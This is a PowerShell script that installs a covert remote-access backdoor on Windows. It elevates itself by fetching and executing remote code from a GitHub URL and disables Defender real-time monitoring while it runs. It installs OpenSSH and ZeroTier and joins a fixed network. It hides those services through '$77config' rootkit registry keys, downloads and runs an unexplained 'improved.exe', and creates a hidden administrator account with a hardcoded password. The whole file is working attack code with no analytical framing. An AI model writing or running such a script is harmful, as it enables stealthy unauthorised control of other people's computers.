# Check for administrator privileges and request elevation if needed
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    # Command to download and execute the script from the URL
    $command = "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Ogyeet10/installer9000/main/conf.ps1')"
    
    # Encode the command to bypass issues with special characters in the URL
    $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))

    # Restart PowerShell as Administrator and execute the encoded command
    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -EncodedCommand $encodedCommand" -Verb RunAs
    exit # Exits the current, non-administrative script instance
}

# Start a new PowerShell window to install and configure OpenSSH Server asynchronously
$openSSHScriptBlock = {
    # Install OpenSSH Server feature if not already present
    if (-not (Get-WindowsCapability -Online | Where-Object { $_.Name -like "OpenSSH.Server*" -and $_.State -eq "Installed"})) {
        Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
    }
    
    # Start and set the SSHD service to run automatically
    Start-Service sshd
    Set-Service -Name sshd -StartupType 'Automatic'

    # Optional: Configure SSHD Config file here if necessary
}

# Encode the script block to base64 to ensure it's correctly executed in a new window
$bytes = [System.Text.Encoding]::Unicode.GetBytes($openSSHScriptBlock.ToString())
$encodedCommand = [Convert]::ToBase64String($bytes)

# Launch the script block in a new PowerShell window
Start-Process PowerShell.exe -ArgumentList "-NoProfile -EncodedCommand $encodedCommand" -WindowStyle Hidden

# Download and Install ZeroTier One silently
$zeroTierMsiUrl = "https://download.zerotier.com/RELEASES/1.6.5/dist/ZeroTierOne.msi"
$zeroTierMsiPath = Join-Path $env:TEMP "ZeroTierOne.msi"
Invoke-WebRequest -Uri $zeroTierMsiUrl -OutFile $zeroTierMsiPath
Start-Process "msiexec.exe" -ArgumentList "/i `"$zeroTierMsiPath`" /quiet" -Wait

# Disable Windows Defender Antivirus
Set-MpPreference -DisableRealtimeMonitoring $true

# Base path for the $77config configuration
$baseConfigPath = "HKLM\SOFTWARE\$77config"

# Commands to ensure the $77config key and necessary subkeys exist
$ensurePathsCommands = @(
    "reg add ""$baseConfigPath"" /f",
    "reg add ""$baseConfigPath\service_names"" /f",
    "reg add ""$baseConfigPath\process_names"" /f"
)

foreach ($cmdCommand in $ensurePathsCommands) {
    Start-Process cmd.exe -ArgumentList "/c", $cmdCommand -Wait
}

# Define service names to hide - ZeroTier and SSH service
$servicesToHide = @("ZeroTierOneService", "sshd") # Replace 'sshd' with your specific SSH service name if different

# Hide specified services using reg add
foreach ($service in $servicesToHide) {
    $cmdCommandService = "reg add ""$baseConfigPath\service_names"" /v $service /t REG_SZ /d $service /f"
    Start-Process cmd.exe -ArgumentList "/c", $cmdCommandService -Wait
}

# Add reg.exe to the list of processes to hide
$processesToHide = @("reg.exe") # Add any additional process names here

# Hide specified processes using reg add
foreach ($process in $processesToHide) {
    # For clarity and consistency, use the process name both as the value name and the value
    $cmdCommandProcess = "reg add ""$baseConfigPath\process_names"" /v $process /t REG_SZ /d $process /f"
    Start-Process cmd.exe -ArgumentList "/c", $cmdCommandProcess -Wait
}

# Define the URL and download location for improved.exe
$exeUrl = "https://github.com/Ogyeet10/installer9000/raw/main/improved.exe"
$tempFolder = $env:TEMP
$exePath = Join-Path $tempFolder "improved.exe"

# Download improved.exe from the provided URL
Invoke-WebRequest -Uri $exeUrl -OutFile $exePath

# Execute improved.exe without waiting for completion
Start-Process -FilePath $exePath -Verb RunAs -Wait

# Delete the downloaded improved.exe
Remove-Item $exePath -Force

# Create a new user `ssh-user` with administrative privileges
$userName = "ssh-user"
$password = ConvertTo-SecureString "aidan123" -AsPlainText -Force
New-LocalUser -Name $userName -Password $password -Description "SSH user account" -UserMayNotChangePassword -PasswordNeverExpires
Add-LocalGroupMember -Group "Administrators" -Member $userName

# Path to the SpecialAccounts\UserList registry key
$specialAccountsPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"

# Check if the SpecialAccounts\UserList key exists, if not, create it
if (-not (Test-Path $specialAccountsPath)) {
    New-Item -Path $specialAccountsPath -Force
}

# Add the ssh-user to the UserList to hide it from the sign-in screen
New-ItemProperty -Path $specialAccountsPath -Name "ssh-user" -Value 0 -PropertyType DWORD -Force

# Join the specified ZeroTier network
# Ensure the ZeroTier service is running before attempting to join a network
Start-Service -Name "ZeroTierOneService"
$networkId = "af78bf9436d39eb1" # Replace with your network ID
Start-Sleep -Seconds 5 # Give some time for the ZeroTier service to start
& "C:\Program Files (x86)\ZeroTier\One\zerotier-cli.bat" join $networkId

# Re-enable Windows Defender Antivirus
Set-MpPreference -DisableRealtimeMonitoring $false

Remove-Item $zeroTierMsiPath -Force

Write-Host "Setup complete. SSH user created and configured. Joined ZeroTier network: $networkId."
Write-Host "Windows Defender Antivirus has been re-enabled."

Read-Host -Prompt "Press Enter to exit"

